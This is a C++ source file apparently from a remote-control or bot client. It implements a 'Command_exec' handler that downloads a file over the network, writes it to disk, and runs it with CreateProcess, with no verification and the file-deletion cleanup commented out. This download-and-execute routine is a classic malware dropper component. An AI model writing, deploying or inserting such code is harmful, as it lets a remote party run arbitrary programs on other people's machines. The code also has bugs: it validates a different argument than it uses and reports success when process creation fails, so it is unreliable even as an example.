#include "stdafx.h"
#include "Command_exec.h"
#include "Network.h"

Command_exec::Command_exec()
{
}

Command_exec::~Command_exec()
{
}

bool Command_exec::OnExecute(const std::vector<std::tstring> &args)
{
	if(!(args.size() > 1))
		return false;

	if(!(args[1].size()))
		return false;

	const TCHAR *file_path = args[0].c_str();
	const TCHAR *file_name = PathFindFileName(file_path);
	std::string file_path_s = Util::t2s(args[0]);

	size_t resp_len;
	char *resp;

	bool nret = network.GetFile(file_path_s.c_str(), &resp_len, &resp);
	if(!nret)
	{
		return false;
	}

	bool ret = true;

	HANDLE hFile = CreateFile(file_name, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		Error(_T("exec: Failed to create file"));
		ret = false;
		goto out_free_resp;
	}

	DWORD written;
	WriteFile(hFile, resp, resp_len, &written, 0);
	if(written != resp_len)
	{
		Error(_T("exec: Written differs from buffer length"));
		CloseHandle(hFile);
		ret = false;
		goto out_delete_file;
	}

	CloseHandle(hFile);


	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	ZeroMemory(&pi, sizeof(pi));
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);

	BOOL pret = CreateProcess(file_name, NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
	if(!pret)
	{
		Error(_T("exec: Failed to create process"));
		goto out_delete_file;
	}

out_delete_file: // DeleteFileA(file_name);
out_free_resp:      free(resp);
	return ret;
}